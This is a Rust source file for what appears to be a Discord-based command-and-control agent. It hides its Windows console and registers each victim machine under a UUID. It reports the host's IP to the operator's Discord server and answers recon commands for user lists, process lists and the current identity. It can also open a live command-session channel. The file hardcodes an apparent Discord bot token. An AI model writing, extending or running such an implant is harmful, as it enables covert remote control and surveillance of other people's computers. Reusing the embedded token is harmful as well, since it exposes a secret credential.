#![windows_subsystem = "windows"]

use std::sync::RwLock;
use std::time::Duration;

use serenity::{
    async_trait, client::Context, model::{channel::{Message}, gateway::Ready, id::{ChannelId}, application::interaction::InteractionResponseType}, prelude::*,
    framework::standard::{
        macros::{command, group},
        CommandResult, StandardFramework,
    },
};
use serenity::model::channel::ChannelType;

use uuid::Uuid;

mod commands;

use commands::recon::*;

mod utils;

use utils::utils::*;

static CHANNEL_NAME: RwLock<Option<Uuid>> = RwLock::new(None);
static AGENT_CAT_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
static AGENT_COMMAND_ID: RwLock<Option<ChannelId>> = RwLock::new(None);

#[group("general")]
#[commands(c_userlist, c_tasklist, c_whoami, c_cmdsesh)]
struct General;

#[tokio::main]
async fn main() {

    // Configure the client with your Discord bot token in the environment.
    let token = String::from("MTA4NzQ2MzExMjY3ODA1NTkzNg.Gf19_l.w7FqiCApRPbPZWws6YVdRjUaT4jx7Ap_zJWlrY");

    // Set gateway intents, which decides what events the bot will be notified about
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    let framework = StandardFramework::new()
        .configure(|c| c.prefix("!")) // Set the bot's command prefix
        .group(&GENERAL_GROUP);

    // Create our client object with the token and intents, throws error if building the client.
    let mut client =
        Client::builder(&token, intents).event_handler(Handler).framework(framework).await.expect("Error when creating the client");

    if let Err(why) = client.start().await {
        println!("Client error: {:?}", why);
    }
}


struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);

        match get_or_create_uuid() {
            Ok(uuid) => {
                println!("UUID: {:?}", uuid);
                *CHANNEL_NAME.write().unwrap() = Some(uuid);
            }
            Err(e) => {
                eprintln!("Error creating file: {:?}", e);
                std::process::exit(1);
            }
        };

        // Create a text channel in the first guild the bot is connected to
        let guilds = &ready.guilds;
        if let Some(guild_id) = guilds.first().map(|g| g.id) {
            println!("GUILD ID: {:?}", guild_id);
            *AGENT_CAT_ID.write().unwrap() = get_category_uuid(&ctx, Some(guild_id)).await;

            if let Err(why) = get_agent_ip(&ctx).await {
                println!("Ran into error when sending ip sadly: {}", why);
            };
        }
    }
}

#[command]
#[aliases("userlist")]
async fn c_userlist(ctx: &Context, msg: &Message) -> CommandResult {
    match is_designated_channel(msg) {
        Ok(true) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, userlist()).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }

    Ok(())
}

#[command]
#[aliases("tasklist")]
async fn c_tasklist(ctx: &Context, msg: &Message) -> CommandResult {
    match is_designated_channel(msg) {
        Ok(true) => {
            let tasklist_str = tasklist();
            let chunks = split_tasklist(&tasklist_str, 1900); // Discord has a 2000 character limit per message; 1900 gives some buffer

            for chunk in chunks {
                if let Err(why) = msg.channel_id.say(&ctx.http, &chunk).await {
                    eprintln!("Error sending message: {:?}", why);
                }
            }
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }

    Ok(())
}

#[command]
#[aliases("whoami")]
async fn c_whoami(ctx: &Context, msg: &Message) -> CommandResult {
    match is_designated_channel(msg) {
        Ok(true) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, whoami()).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
        Ok(false) => {}
        Err(why) => {
            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
                eprintln!("Error sending message: {:?}", why);
            }
        }
    }

    Ok(())
}

#[command]
#[aliases("cmdsesh")]
async fn c_cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
    if is_designated_channel(msg)? {
        let sent_message = msg
            .channel_id
            .send_message(&ctx.http, |m| {
                m.content("Are you sure you want to open a command session?")
                    .components(|c| {
                        c.create_action_row(|row| {
                            row.create_select_menu(|menu| {
                                menu.custom_id("session_dialog");
                                menu.placeholder("OPTIONS");
                                menu.options(|f| {
                                    f.create_option(|o| o.label("✅ Yes").value("Yes"));
                                    f.create_option(|o| o.label("❌ No").value("No"))
                                })
                            })
                        })
                    })
            })
            .await
            .unwrap();

        let interaction = match sent_message
            .await_component_interaction(&ctx)
            .timeout(Duration::from_secs(60 * 3))
            .await
        {
            Some(x) => x,
            None => {
                sent_message.reply(&ctx, "Timed out").await.unwrap();
                return Ok(());
            }
        };

        let decision = &interaction.data.values[0];

        if decision == "Yes" {
            sent_message.delete(&ctx).await.unwrap();

            let guild_id = msg.guild_id.unwrap();
            let command_id = AGENT_COMMAND_ID.read().unwrap().unwrap();
            guild_id
                .create_channel(&ctx.http, |c| {
                    c.name("live-cmd-session").kind(ChannelType::Text).category(command_id)
                })
                .await
                .unwrap();
        } else if decision == "No" {
            interaction
                .create_interaction_response(&ctx, |r| {
                    r.kind(InteractionResponseType::ChannelMessageWithSource)
                        .interaction_response_data(|d| {
                            d.ephemeral(true)
                                .content("User denied session creation")
                        })
                })
                .await
                .unwrap();
            sent_message.delete(&ctx).await.unwrap();
        }
    }

    Ok(())
}